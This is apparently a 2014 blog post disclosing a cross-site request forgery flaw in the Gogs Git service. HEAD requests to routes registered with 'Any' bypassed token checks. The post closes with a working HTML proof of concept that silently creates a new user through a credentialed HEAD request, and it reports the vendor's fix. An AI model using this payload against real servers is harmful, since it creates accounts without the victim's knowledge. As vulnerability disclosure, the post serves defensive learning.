---
date: 2014-06-30 04:15:48 GMT
slug: csrf-in-gogs-via-head
tags: Go,csrf
title: CSRF in Gogs via HEAD
author: Tom Steele
type: text
---

I'm a big fan of [Go](http://golang.org/), so I'm always on the look out for emerging projects within the community. One such project is [Gogs](http://gogs.io/), an open source self-hosted Git service. This is a pretty ambitious effort, and  definitely a project to watch. While looking over some of the code I identified a [Cross-Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery) ("CSRF") vulnerability that presented itself in a not so common manner.

CSRF is a technique that exploits a server's inherit trust in the user's browser. In practice, an attacker will host a malicious site and submit requests on behalf of the user. There are [many techniques](https://community.rapid7.com/community/metasploit/blog/2014/04/15/exploiting-csrf-without-javascript) to do this, far too many to discuss here, but the results can be [devastating](http://disconnected.io/2014/03/18/how-i-hacked-your-router/).

Preventing CSRF is fairly straight forward, one common way is to use a double-submit token. Where a random value is stored in the user's session or a separate cookie, and when a request to change a resource is submitted, it is compared to a form value or header. This is the method used by Gogs. Code for token generation and extraction is [here](https://github.com/gogits/gogs/blob/99713e1180ad149faf6442bba311fec6e501aa00/modules/middleware/context.go#L245-L270). And we can see [here](https://github.com/gogits/gogs/blob/e323604d781268a39febced13a2fb6caae2d126c/modules/middleware/auth.go#L37-L40) that all POST requests must have a valid token, or a 403 is returned.

This is valid because applications should not change state via the GET method, and other methods, including DELETE, PUT, PATCH, etc. will be "preflighted" using the OPTIONS method to determine if the request if safe to send. A great resource for the wonder that is CORS rules is available [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS). As an aside, beware of only protecting POST routes, because [sometimes](http://blog.nodesecurity.io/post/60555138201/bypass-connect-csrf-protection-by-abusing) it's not enough. OK, now that were all experts, on with the vulnerability.

Gogs uses [Martini](https://github.com/go-martini/martini), which supports Sinatra like routing. We can see routes for managing users below.

~~~~~go
// Taken from https://github.com/gogits/gogs/blob/45462662e9bdb001f1cf3d4ca0e4d679757c7642/web.go

m.Group("/admin/users", func(r martini.Router) {
    r.Any("/new", bindIgnErr(auth.RegisterForm{}), admin.NewUser)
    r.Any("/:userid", bindIgnErr(auth.AdminEditUserForm{}), admin.EditUser)
    r.Any("/:userid/delete", admin.DeleteUser)
}, adminReq)
~~~~~

We see that `r` is the router variable and is using the `Any` method to setup routing. `Any` works how you probably expect, it accepts any method. Let's focus on the `"/new"` route, which is used to create a new user.

~~~~~go
// Taken from https://github.com/gogits/gogs/blob/d0e6a4c25acc3414f6d0f93cc50e6dcb41111c19/routers/admin/user.go

func NewUser(ctx *middleware.Context, form auth.RegisterForm) {
    ctx.Data["Title"] = "New Account"
    ctx.Data["PageIsUsers"] = true

    if ctx.Req.Method == "GET" {
        ctx.HTML(200, "admin/users/new")
        return
    }

    if form.Password != form.RetypePasswd {
        ctx.Data["HasError"] = true
        ctx.Data["Err_Password"] = true
        ctx.Data["Err_RetypePasswd"] = true
        ctx.Data["ErrorMsg"] = "Password and re-type password are not same"
        auth.AssignForm(form, ctx.Data)
    }

    if ctx.HasError() {
        ctx.HTML(200, "admin/users/new")
        return
    }

    u := &models.User{
        Name:     form.UserName,
        Email:    form.Email,
        Passwd:   form.Password,
        IsActive: true,
    }

    var err error
    if u, err = models.RegisterUser(u); err != nil {
        switch err {
        case models.ErrUserAlreadyExist:
            ctx.RenderWithErr("Username has been already taken", "admin/users/new", &form)
        case models.ErrEmailAlreadyUsed:
            ctx.RenderWithErr("E-mail address has been already used", "admin/users/new", &form)
        case models.ErrUserNameIllegal:
            ctx.RenderWithErr(models.ErrRepoNameIllegal.Error(), "admin/users/new", &form)
        default:
            ctx.Handle(200, "admin.user.NewUser", err)
        }
        return
    }

    log.Trace("%s User created by admin(%s): %s", ctx.Req.RequestURI,
        ctx.User.LowerName, strings.ToLower(form.UserName))

    ctx.Redirect("/admin/users")
}
~~~~~

We see that if the method is GET, then it returns and renders the template containing a form to create a new user, and if not, it creates the user. We saw earlier that POST's are protected, and other methods will be preflighted, but if you're following closely, and familiar with your CORS rules, you'll note that we didn't mention the HEAD method, which is not preflighted and does not require a token. Combine that with the behavior of the form parsing library, which treats query strings the same a payload and you have yourself CSRF.

An attacker can host the following to create a new user.

~~~~~html
<html>
    <head>
    <script>
      var http = new XMLHttpRequest();
      http.open('HEAD', 'http://your.git.computer/admin/users/new?username=badguy&email=badguy@evil.com&passwd=foobar&retypepasswd=foobar');
      http.withCredentials = true;
      http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      http.send();
    </script>
    </head>
    <body>
Hi
    </body>
</html>
~~~~~

The Gogs' development team was extremely responsive and fixed this within a day. To do this, they setup explicit routes and handlers for GET and POST methods, and removed all use of `ANY`. Not being explicit in what you're allowing from a user is the root of many vulnerabilities, and that is the lesson here, where possible only support what you're expecting and strictly validate all input.
